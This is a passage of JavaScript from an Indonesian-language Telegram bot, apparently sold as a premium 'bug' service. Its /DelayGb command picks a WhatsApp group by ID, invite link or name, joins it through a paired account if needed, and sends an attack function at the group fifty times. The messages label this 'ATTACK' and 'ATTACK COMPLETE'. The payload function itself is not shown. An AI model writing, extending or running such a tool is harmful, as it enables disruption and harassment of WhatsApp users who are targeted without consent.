            String(OWNER_ID),
            `⚠️ мαηтα'χ 𝙒𝘼𝙍𝙉𝙄𝙉𝙂 ⚠️
✘ Akses Private Diblokir

♛ User ID   : ${uid}
♛ Username  : ${uname}
♛ Mode      : GROUP ONLY`
          ).catch(() => { })
        }, 0)
      }
      return
    }

    if (isCommandBlocked("DelayGb") && !isOwner(senderId)) {
      return bot.sendMessage(chatId, `\`\`\`\n✘ мαηтα'χ — COMMAND BLOCKED\n♛ Status  : Sedang Dinonaktifkan\n♛ Info    : Hubungi Owner untuk unblock\n༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ\n\`\`\``, { parse_mode: "Markdown" });
    }

    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date()) && !isGroupPremium(chatId)) {
      return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
        caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`\n( ! ) Silahkan AddPremium Sebelum Menggunakan Bug`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "𝘖𝘸𝘯𝘦𝘳", url: settings.OWNER_URL }]]
        }
      })
    }

    const otax = sessions.values().next().value
    if (!otax) {
      return bot.sendPhoto(chatId, botLinks.default || defaultLinks.default, {
        caption: `\`\`\`
✘ мαηтα'χ 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Status  : Tidak Ada Sender Aktif
♛ Info    : Silahkan ReqPair Terlebih Dahulu
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|• мαηтα'χ
\`\`\``,
        parse_mode: "Markdown"
      })
    }

    if (typeof otax.groupFetchAllParticipating !== "function") {
      return bot.sendMessage(
        chatId,
        "```⸙ мαηтα'χ — ERROR\n✘ Sender belum siap.\n✘ Tunggu 3–5 detik atau /refresh```",
        { parse_mode: "Markdown" }
      )
    }

    const raw = (match[1] || "").trim()

    const groupsAll = await otax.groupFetchAllParticipating().catch(() => ({}))
    const groups = Object.values(groupsAll).map(g => ({
      id: g.id,
      name: g.subject || "-"
    }))

    if (!groups.length) {
      return bot.sendMessage(
        chatId,
        "```⸙ мαηтα'χ — NO GROUP DETECTED\n✘ Tidak ada grup pada sender aktif```",
        { parse_mode: "Markdown" }
      )
    }

    let groupJid = ""
    let groupName = ""

    if (!raw) {
      let text = "⸙ *мαηтα'χ — GROUP LIST*\n\n"
      for (const g of groups) text += `♛ *${g.name}*\n\`${g.id}\`\n\n`
      text += "_Gunakan:_ `/DelayGb <JID | link | nama>`"
      return bot.sendMessage(chatId, text, { parse_mode: "Markdown" })
    }

    if (/@g\.us$/.test(raw)) {
      const found = groups.find(g => g.id === raw)
      if (!found) {
        return bot.sendMessage(chatId, "```⦸ Grup tidak ditemukan (JID).```", { parse_mode: "Markdown" })
      }
      groupJid = found.id
      groupName = found.name
    } else if (/chat\.whatsapp\.com\/[A-Za-z0-9_-]{20,24}/.test(raw)) {
      const code = raw.match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]{20,24})/)?.[1]
      if (!code) {
        return bot.sendMessage(chatId, "```⦸ Link grup tidak valid.```", { parse_mode: "Markdown" })
      }
      let info = await otax.groupGetInviteInfo(code).catch(() => null)
      if (!info?.id) {
        await bot.sendMessage(chatId, "```ꀆ Bot belum join, mencoba masuk grup...```", { parse_mode: "Markdown" })
        await otax.groupAcceptInvite(code).catch(() => null)
        await sleep(4000)
        info = await otax.groupGetInviteInfo(code).catch(() => null)
      }
      if (!info?.id) {
        return bot.sendMessage(chatId, "```⦸ Gagal masuk atau link sudah tidak aktif.```", { parse_mode: "Markdown" })
      }
      groupJid = info.id.endsWith("@g.us") ? info.id : info.id + "@g.us"
      groupName = info.subject || "-"
    } else {
      const q = raw.toLowerCase()
      const found =
        groups.find(g => g.name.toLowerCase() === q) ||
        groups.find(g => g.name.toLowerCase().includes(q))
      if (!found) {
        return bot.sendMessage(chatId, "```⦸ Nama grup tidak ditemukan.```", { parse_mode: "Markdown" })
      }
      groupJid = found.id
      groupName = found.name
    }

    await bot.sendMessage(
      chatId,
      "```\nꀆ Menarget grup...\n♛ " + groupName + "\n♛ " + groupJid + "\n```",
      { parse_mode: "Markdown" }
    )

    const startMsg = await bot.sendMessage(
      chatId,
      "```\n✘ мαηтα'χ ATTACK ✘\n♛ Target : " +
      groupName +
      "\n♛ JID    : " +
      groupJid +
      "\n♛ Status : Mengirim...\n```",
      { parse_mode: "Markdown" }
    ).catch(() => null)

    const cycles = 50
    for (let i = 0; i < cycles; i++) {
      await ofmcrlMantaGb(otax, groupJid).catch(() => null)
      await sleep(1000)
    }

    const final =
      "```\n✘ мαηтα'χ ATTACK COMPLETE ✘\n♛ Target : " +
      groupName +
      "\n♛ JID    : " +
      groupJid +
      "\n♛ Time   : " +
      new Date().toLocaleString("id-ID") +
      "\n```"

    if (startMsg) {
      await bot
        .editMessageCaption(final, {
          chat_id: chatId,
          message_id: startMsg.message_id,
          parse_mode: "Markdown"
        })
        .catch(() => bot.sendMessage(chatId, final, { parse_mode: "Markdown" }))
    } else {
      await bot.sendMessage(chatId, final, { parse_mode: "Markdown" })
    }
  } catch (e) {
    await bot.sendMessage(
      chatId,
      "```⸙ мαηтα'χ — 𝙀𝙍𝙍𝙊𝙍\n✘ Terjadi kesalahan saat menjalankan /DelayGb.\n✘ Detail: " +
      (e?.message || "Unknown error") +
      "```",
      { parse_mode: "Markdown" }
    )
  }
});
// Auto-reload dinonaktifkan — menyebabkan duplicate process.
// Restart manual: taskkill /F /IM node.exe && npm start
